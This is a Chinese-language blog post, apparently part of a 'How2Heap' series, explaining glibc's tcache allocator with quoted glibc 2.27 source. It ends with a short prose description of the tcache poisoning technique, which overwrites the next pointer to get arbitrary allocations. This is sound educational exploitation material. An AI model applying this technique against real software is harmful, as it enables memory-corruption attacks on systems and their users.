@@ -1,0 +1,1408 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="John Doe">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="John Doe">
+    
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog,blog,pwn,heap">
+    
+    <meta name="description" content="">
+    <meta name="description" content="什么是tcache？就是glibc2.26之后为了再提速，在fastbin上面又加入了一个cache机制叫tcache。每个thread由一个结构体tcache_perthred_struct管理，里面是两个数组，一个管理每条链上的tcache数目，另一个用单向链表连接起chunk，就用一个指针（这个指针直接指向user data）。每条链上最多连7个，并且和fastbin一样也不会重置prev_">
+<meta property="og:type" content="article">
+<meta property="og:title" content="How2Heap(8)(end)——Tcache">
+<meta property="og:url" content="http://example.com/2024/07/28/How2Heap-8-end-%E2%80%94%E2%80%94Tcache/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="什么是tcache？就是glibc2.26之后为了再提速，在fastbin上面又加入了一个cache机制叫tcache。每个thread由一个结构体tcache_perthred_struct管理，里面是两个数组，一个管理每条链上的tcache数目，另一个用单向链表连接起chunk，就用一个指针（这个指针直接指向user data）。每条链上最多连7个，并且和fastbin一样也不会重置prev_">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-07-28T08:01:35.000Z">
+<meta property="article:modified_time" content="2024-07-28T14:00:33.801Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    
+    <title>How2Heap(8)(end)——Tcache · Zj_W1nd&#39;s BLOG</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20211217" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20211217" as="style">
+    <link rel="stylesheet" href="/css/dark.css">
+    <link rel="stylesheet" href="/css/mobile.css?v=20211217" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20211217" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20211217" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- Google tag (gtag.js) -->
+    
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>Zj_W1nd's BLOG</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">Zj_W1nd&#39;s BLOG</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">How2Heap(8)(end)——Tcache</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:50vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+    
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                How2Heap(8)(end)——Tcache
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="heap">heap</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="pwn">pwn</a>
+    
+</div>
+
+                
+                <!-- 文章字数统计 -->
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2024/07/28</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="什么是tcache？"><a href="#什么是tcache？" class="headerlink" title="什么是tcache？"></a>什么是tcache？</h1><p>就是glibc2.26之后为了再提速，在fastbin上面又加入了一个cache机制叫tcache。每个thread由一个结构体<code>tcache_perthred_struct</code>管理，里面是两个数组，一个管理每条链上的tcache数目，另一个用单向链表连接起chunk，就用一个指针（<strong>这个指针直接指向user data</strong>）。每条链上最多连7个，并且和fastbin一样也不会重置prev_inuse位，不合并。</p>
+<p>总的来说，tcache的思想类似于cpu的cache的感觉但是更加简化（比如没有淘汰替换算法），优先级最高，他还会主动将chunk从其他bin中往自己的链上装。</p>
+<h2 id="申请内存上的改动"><a href="#申请内存上的改动" class="headerlink" title="申请内存上的改动"></a>申请内存上的改动</h2><p>tcache的优先级很高，从tcache中取chunk的步骤发生在<code>__libc_malloc()</code>中而不是<code>_int_malloc</code>，这意味着如果这个cache起作用了能节省相当大的一部分时间（会在libc_malloc就返回根本不会调用_int_malloc）。tcache遵循后进先出的LIFO原则。</p>
+<p>在第一次调用malloc的时候<code>__libc_malloc</code>会初始化tcache。然后如果能取就从tcache中取chunk返回。</p>
+<p>下面的源码取自glibc2.27的<code>__libc_malloc</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="type">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
+<h2 id="释放上的改动"><a href="#释放上的改动" class="headerlink" title="释放上的改动"></a>释放上的改动</h2><p>free也是优先放入tcache，下面是<code>_int_free</code>中开头的一段代码，可以看到如果还能放下（检查idx和数量）就直接放入tcache并返回。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">	&amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">	&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">      &#123;</span><br><span class="line">	tcache_put (p, tc_idx);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
+<h2 id="cache的装入策略"><a href="#cache的装入策略" class="headerlink" title="cache的装入策略"></a>cache的装入策略</h2><p>在_int_malloc中，每个size的处理分支都加了一段tcache的代码，fastbin的if分支内添加了如下一段：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast ()))</span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">	      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">		 stash them in the tcache.  */</span></span><br><span class="line">	      <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">		&#123;</span><br><span class="line">		  mchunkptr tc_victim;</span><br><span class="line">		  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">		  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">			 &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">			*fb = tc_victim-&gt;fd;</span><br><span class="line">		      <span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">			  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">			  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">			    <span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">		    &#125;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>在small bin的分支则是这样一段（大差不差）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">	  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">	     stash them in the tcache.  */</span></span><br><span class="line">	  <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	    &#123;</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line">	      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">	      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      bck = tc_victim-&gt;bk;</span><br><span class="line">		      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">		      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);</span><br><span class="line">		      bin-&gt;bk = bck;</span><br><span class="line">		      bck-&gt;fd = bin;</span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
+<p>在后续大循环处理unsorted bin的时候，没有tacache的情况下，发现exact fit会直接返回，但有tcache的话会先装进cache然后继续遍历，装满或者遍历结束再返回，chunk会等会返回。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">		set_non_main_arena (victim);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">	      <span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment">		 We may return one of these chunks later.  */</span></span><br><span class="line">	      <span class="keyword">if</span> (tcache_nb</span><br><span class="line">		  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">		&#123;</span><br><span class="line">		  tcache_put (victim, tc_idx);</span><br><span class="line">		  return_cached = <span class="number">1</span>;<span class="comment">//这个标记启用了说明tcache中有恰好满足要求的chunk，等下用这个判断</span></span><br><span class="line">		  <span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	      <span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+<p>在往tcache中装chunk的时候维护了一个计数器tcache_unsorted_count，循环末尾如果这个数已经足够大了并且tcache中有我们需要的chunk就从tcache中返回。同时如果遍历结束了（在循环外）并且return_cached被置位那么也从tcache返回，代码略，就是一句话。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span></span><br><span class="line"><span class="comment">	 filling the cache, return one of the cached ones.  */</span></span><br><span class="line">      ++tcache_unsorted_count;</span><br><span class="line">      <span class="keyword">if</span> (return_cached</span><br><span class="line">	  &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span></span><br><span class="line">	  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
+<p>largebin的处理中不涉及tcache。</p>
+<h2 id="tcache-get和tcache-put"><a href="#tcache-get和tcache-put" class="headerlink" title="tcache_get和tcache_put"></a>tcache_get和tcache_put</h2><p>tcache操作的核心就是最简单的两个函数：tcache_get（取）和tcache_put（存）</p>
+<p>核心取的函数在<code>tcache_get</code>上，然而这个函数简单的不能再简单（为了速度，而且是永远内联）：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>就是从链表头取一个然后count-1。保护就是两个断言，分别检查了idx是不是比最大数量小，然后对应链的tcache是否为空，没有指针检查。</p>
+<p>tcache_put也是一样，就是直接一个单向链表插入然后计数+1</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<span class="comment">//这是因为tcache指针直接指向user data</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里也能看出，插入永远插入链表头，取也是优先从头取，说明tcache是LIFO结构。</p>
+<h1 id="怎么攻击？"><a href="#怎么攻击？" class="headerlink" title="怎么攻击？"></a>怎么攻击？</h1><h2 id="简单覆盖tcache-poisoning"><a href="#简单覆盖tcache-poisoning" class="headerlink" title="简单覆盖tcache_poisoning"></a>简单覆盖tcache_poisoning</h2><p>和fastbin的思想一样，直接覆盖fd（next）指针，malloc同样大小两次就行。而且没有size检查随便写。</p>
